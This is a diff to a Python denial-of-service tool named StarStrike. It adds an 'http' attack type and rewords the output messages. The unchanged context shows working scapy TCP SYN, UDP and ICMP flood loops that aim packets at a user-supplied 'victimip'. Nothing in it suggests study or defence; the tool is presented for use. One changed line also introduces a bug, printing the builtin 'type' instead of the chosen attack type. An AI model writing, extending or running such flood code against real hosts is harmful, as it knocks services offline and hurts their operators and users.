@@ -33,16 +33,16 @@ from fake_useragent import UserAgent
 
 def print_banner():
     print(r'''
-#          _____ __             _____ __     _ __            #
-#         / ___// /_____ ______/ ___// /____ (_) /_____      #
-#        \__ \/ __/ __ `/ ___/\__ \/ __/ __/ / //_/ _ \      #
-#        ___/ / /_/ /_/ / /   ___/ / /_/ /  / ,< /  __/      #
-#       /____/\__/\__,_/_/   /____/\__/\/ _/_/|_|\___/       #
+#          _____ __             _____ __      _              #
+#         / ___// /_____ ______/ ___// /____ (_)/____        #
+#        \__ \/ __/ __ `/ ___/\__ \/ __/ __// //_/ _ \       #
+#        ___/ / /_/ /_/ / /   ___/ / /_/ / / ,< /  __/       #
+#       /____/\__/\__,_/_/   /____/\__/_/ /_/|_|\___/        #
 #                                                            #
 ''')
 
 tsize = 0 #total bytes sent
-types = ["tcp", "udp", "icmp"] # types of attack
+types = ["tcp", "udp", "icmp", "http"] # types of attack
 athreads = [] # contains all current threads
 ros = 0
 
@@ -77,7 +77,7 @@ if len(sys.argv) > 1:
         # set the type
         if arg.startswith("--type"):
             typea = arg.removeprefix("--type")
-            if not typea in types: exit(f"{typea} as an attack type doesnt exist!")
+            if not typea in types: exit(f"{type} as an attack type doesnt exist!")
         # the victims ip
         if arg.startswith("--victimip"):
             dest_ip = arg.removeprefix("--victimip")
@@ -114,7 +114,7 @@ def tcp_flood(thread):
         try:send(packet, verbose=False) #send the packet
         except Exception as e: print(e)
         tsize += payload_size #dawg im not putting these comments in every attack function
-        if doprint: print(f"[TCP SYN] PAYLOAD {payload_size} TO {dest_ip} THREAD {thread}") #LarpStrike
+        if doprint: print(f"[TCP SYN] PAYLOAD OF {payload_size}B TO {dest_ip} THREAD {thread}") #LarpStrike
         sleep(0)
 
 #do a icmp flood attack
@@ -127,7 +127,7 @@ def icmp_flood(thread):
         packet = IP(src = source, dst = dest_ip) / ICMP() / Raw(load = payload)
         send(packet, verbose=False)
         tsize += payload_size
-        if doprint: print(f"[ICMP] PAYLOAD {payload_size} TO {dest_ip} THREAD {thread}")
+        if doprint: print(f"[ICMP] PAYLOAD OF {payload_size}B TO {dest_ip} THREAD {thread}")
         sleep(0)
 
 #do a udp flood attack
@@ -142,7 +142,7 @@ def udp_flood(thread):
         try: send(packet, verbose=False)
         except Exception as e: print(e)
         tsize += payload_size
-        if doprint: print(f"[UDP] PAYLOAD {payload_size} TO {dest_ip} THREAD {thread}")
+        if doprint: print(f"[UDP] PAYLOAD OF {payload_size}B TO {dest_ip} THREAD {thread}")
         sleep(0)
 
 #send request, used for http flood
@@ -193,7 +193,7 @@ def attack(thread):
 #-- MAIN --#
 def main():
     print_banner()
-    print("created by solez, for NETWORK0 group\n")
+    print("StarStrike created by solez, for NETWORK0 group\n")
     # HelloWorld("print")
     tcount = threads
     while not len(athreads) == threads:
